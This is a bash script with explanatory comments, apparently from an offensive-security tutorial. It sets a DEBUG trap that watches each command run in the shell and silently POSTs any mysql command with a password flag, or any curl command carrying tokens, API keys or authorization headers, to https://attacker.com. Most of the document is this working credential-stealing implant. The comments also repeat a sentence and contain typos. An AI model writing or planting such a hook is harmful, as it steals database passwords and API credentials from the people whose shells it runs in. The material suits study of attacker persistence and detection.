#!/bin/bash


hook() {
    case "${BASH_COMMAND}" in
        mysql*)
            if echo "${BASH_COMMAND}" | grep -- "-p\|--password"; then
                curl https://attacker.com \
                    -H "Content-Type:application/json" \
                    -d "{\"command\":\"${BASH_COMMAND}\"}" \
                    --max-time 3 \
                    --connect-timeout 3 \
                    -s &> /dev/null
            fi
            ;;
        curl*)
            if echo "${BASH_COMMAND}" | grep -ie "token" \
                                             -ie "apikey" \
                                             -ie "api_token" \
                                             -ie "bearer" \
                                             -ie "authorization"; then
               curl https://attacker.com \
                   -H "Content-Type:application/json" \
                   -d "{\"command\":\"${BASH_COMMAND}\"}" \
                   --max-time 3 \
                   --connect-timeout 3 \
                   -s &> /dev/null
            fi
            ;;
    esac
}


trap 'hook' DEBUG


# We create a function named hook() that uses a case statement.
# The statement will try to match the BASH_COMMAND variable
# against two patterns:
# mysql* and curl*. These patterns will match anything that starts
# with either of these strings. This should identify uses of the
# mysql command to connect to a database and the curl command to
# make HTTP requests. Next, if the command involved calling
# the mysql client, we check whether the command included a password
# on the command line by using the -p or --password arguments.
# In this case, the password would belong to the database.
# If we have a match, we send an HTTP POST request to
# https://attacker.com containing a JSON payload with the raw
# command in the request's POST body.
# At -ie "authorization", we do a similar thing with curl. We search
# for strings such as token, apiley, api_token, bearer, or
# authorization to catch any API keys being passed on the command line.
# These credentials might belong to an internal web panel or on
# the command line. These crednetials might belong to an internal
# web panel or to an administration interface of some sort.
# The search is case insensitive (-i). If we find such pattern, we
# send a request containing the command and the credential to the
# attacker's website over HTTP POST. Finally, we use trap to
# trap the hook() function with the DEBUG sigspec type.
